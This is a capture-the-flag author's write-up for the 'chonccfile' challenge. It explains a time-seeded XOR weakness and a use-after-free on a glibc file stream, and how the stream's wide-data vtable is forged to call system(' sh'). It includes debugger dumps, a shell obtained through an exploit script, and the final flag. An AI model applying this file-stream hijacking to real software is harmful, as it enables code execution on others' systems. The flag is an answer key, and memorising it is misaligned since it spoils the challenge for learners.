# chonccfile - Author's solution

## About the challenge

This challenge is a simple introduction on exploiting file streams in C.
The author has been researching on the topic and wanted to share the knowledge.

## Technical Mechanism

The program, *chonccfile*, allows the user to allocate memory chunks (a choncc) of an user-specified size.
These chonccs are stored in a linked list, and the user can write to them, read from them, and delete them.
The total size of all chonccs must never exceed 0x200 bytes.
The program allows the user to write the chonccs to a chonccfile, which is a file with the path */tmp/chonccfile*.
However, the user must first open, write, and close the file in the correct order.
If done properly, the program will write the chonccs to the file in a length-prefixed format.

There exists a cryptographic vulnerability in the program.
When the file stream for the chonccfile is closed, the program performs XOR encryption on the entire file stream,
along with calls to *sleep()* to simulate delays.
The values used for the XOR encryption are generated by seeding the random number generator with the current system time.
This results in the values used for encryption to be predictable, once the current system time is known.
This condition can be satisfied, for when a request to write to the chonccfile is made, the program prints a timestamp of the current system time.
An attacker can use this insufficient entropy vulnerability to predict the values used for the XOR encryption, and thus decrypt the file stream, if the encrypted data is known.

A use-after-free vulnerability exists in the file stream handling features of the program.
When a file stream for the chonccfile is closed, the reference to it is not removed.
This causes a use-after-free condition, and allows the attacker to view, and modify an previously deallocated chunk of memory.
An attacker can send malicious input to the program to disclose information about the program's state, and hijack the program's control flow,
causing an arbitrary code execution condition.

## Exploitation Scenario

An attacker can open a chonccfile, then close it to trigger the XOR encryption on the file stream.
Afterwards, the attacker can request to write to the chonccfile, then cancel, and view the timestamp of the current system time.
An attacker can allocate a memory chunk of the same size as the file stream after the file stream has been closed.
Then, the attacker can view the encrypted data, to predict the values used for the XOR encryption.
This allows the attacker to decrypt the data, and view the contents of the memory chunk, which may contain information about the program's state,
including heap addresses and pointers to structures in libc.
Finally, the attacker can write to the memory chunk, which can also be treated as a file stream, and perform a write operation to it;
however, because the attacker can control the entire contents of the memory chunk, and with that, the entire contents of the file stream,
the attacker can modify the file stream to hijack the program's control flow by changing virtual function table addresses and creating a malicious
virtual function table, converting what is originally a file write operation into arbitrary code execution.

## Walkthrough of the Control Flow Hijacking on the call to *fwrite()*

The file stream is a *struct _IO_FILE_plus* structure, which contains a pointer to a virtual function table.
As shown below, the file stream can be modified to point to a malicious virtual function table, which can be used to execute arbitrary code.
Included in the virtual function table is a pointer to the *system()* function in libc, which can be used to execute shell commands.
However, this virtual function table is not directly accessible, as it is stored in a *struct _IO_wide_data* structure, which is pointed to by the file stream.

There are checks to ensure that the *_vtable* field of the *struct _IO_FILE_plus* structure is not modified, but it is not robust enough.
We can modify the *struct _IO_FILE_plus* structure to trigger a further virtual function table lookup on the *struct _IO_wide_data* structure.
One such function is *_IO_wfile_overflow()*, which is normally called for when the file stream is full, and a write operation is requested.

```
[#0] 0x7f7de187d30e → __GI__IO_fwrite(buf=0x561c0be0e480, size=0x4, count=0x1, fp=0x561c0be0e2a0)
[#1] 0x561be3e9f407 → mov rdx, QWORD PTR [rip+0x2c32]        # 0x561be3ea2040
[#2] 0x561be3e9fa76 → jmp 0x561be3e9fa91
[#3] 0x7f7de182a1f0 → __libc_start_call_main(main=0x561be3e9f979, argc=0x1, argv=0x7ffe1a9e7378)
[#4] 0x7f7de182a2b9 → __libc_start_main_impl(main=0x561be3e9f979, argc=0x1, argv=0x7ffe1a9e7378, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffe1a9e7368)
[#5] 0x561be3e9f185 → hlt 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
(remote) gef➤  p *(struct _IO_FILE_plus *)fp
$1 = {
  file = {
    _flags = 0x687320,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = "",
    _lock = 0x561c0be0e308,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x561c0be0e290,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = "\000\000\000\000n0\205\341}\177\000\000\000\343\340\v\034V\000"
  },
  vtable = 0x7f7de19ee2b0 <_IO_wfile_jumps+136>
}
(remote) gef➤  x/8a 0x7f7de19ee2b0
0x7f7de19ee2b0 <_IO_wfile_jumps+136>:   0x7f7de188a17e <__GI__IO_file_close>    0x7f7de188a11e <__GI__IO_file_stat>
0x7f7de19ee2c0 <_IO_wfile_jumps+152>:   0x7f7de188cfce <_IO_default_showmanyc>  0x7f7de188cfee <_IO_default_imbue>
0x7f7de19ee2d0: 0x0     0x0
0x7f7de19ee2e0: 0x7f7de18889de <_IO_new_file_finish>    0x7f7de18836de <__GI__IO_wfile_overflow>
```

The *struct _IO_wide_data* structure pointed by *fp->_wide_data* contains a pointer to another virtual function table.
There are no validations done to ensure that the virtual function table is not modified,
and thus an attacker can modify it to point to a malicious virtual function table.
In this case, on the call to *_IO_wfile_overflow()*, the program will subsequently call *_IO_wdoallocbuf()*,
which performs a virtual function table lookup on *fp->_wide_data->_wide_vtable* at offset 0x68.
As shown below, that pointer is set to the address of the *system()* function in libc.

```
(remote) gef➤  p ((struct _IO_wide_data *)0x561c0be0e290)->_wide_vtable
$3 = (const struct _IO_jump_t *) 0x561c0be0e300
(remote) gef➤  x/14a 0x561c0be0e300
0x561c0be0e300: 0x0     0x0
0x561c0be0e310: 0x0     0xffffffffffffffff
0x561c0be0e320: 0x0     0x561c0be0e308
0x561c0be0e330: 0xffffffffffffffff      0x0
0x561c0be0e340: 0x561c0be0e290  0x0
0x561c0be0e350: 0x0     0x0
0x561c0be0e360: 0x0     0x7f7de185306e <__libc_system>
```

Stepping into execution, we reach *do_system()* in *sysdeps/posix/system.c*, with the argument " sh".

```
──────────────────────────────────────────────────────────────────────────────── source:../sysdeps/posix/system.c+102 ────
     97  #endif
     98  
     99  /* Execute LINE as a shell command, returning its status.  */
    100  static int
    101  do_system (const char *line)
 →  102  {
    103    int status = -1;
    104    int ret;
    105    pid_t pid;
    106    struct sigaction sa;
    107  #ifndef _LIBC_REENTRANT
───────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x7f7de1852bce in do_system (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7de1852bce → do_system(line=0x561c0be0e2a0 " sh")
[#1] 0x7f7de188189e → __GI__IO_wdoallocbuf(fp=0x561c0be0e2a0)
[#2] 0x7f7de18837bd → __GI__IO_wfile_overflow(f=0x561c0be0e2a0, wch=0xbe0e480)
[#3] 0x7f7de187d3d2 → __GI__IO_fwrite(buf=0x561c0be0e480, size=0x4, count=0x1, fp=0x561c0be0e2a0)
[#4] 0x561be3e9f407 → mov rdx, QWORD PTR [rip+0x2c32]        # 0x561be3ea2040
[#5] 0x561be3e9fa76 → jmp 0x561be3e9fa91
[#6] 0x7f7de182a1f0 → __libc_start_call_main(main=0x561be3e9f979, argc=0x1, argv=0x7ffe1a9e7378)
[#7] 0x7f7de182a2b9 → __libc_start_main_impl(main=0x561be3e9f979, argc=0x1, argv=0x7ffe1a9e7378, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffe1a9e7368)
[#8] 0x561be3e9f185 → hlt 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
(remote) gef➤  
```

## Exploit

Included in this directory is an exploit, *exploit.py*,
which demonstrates the control flow hijacking on the call to *fwrite()*.
The exploit will exploit the weakness of the random number generation,
decrypt the file stream, and modify the file stream to execute *system(" sh")*.

To see the usage of the exploit, run the following command:

```
$ python3 exploit.py -h
```

Here is an example of the exploit in action:

```
$ python exploit.py 
[+] Opening connection to localhost on port 5000: Done
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
L3AK{fake_flag}
$  
```

## Flag

✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨ \
Final flag: **L3AK{C0rRuPt3d_FIL3_structs_L0V3_CH0NCC_D474}** \
✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨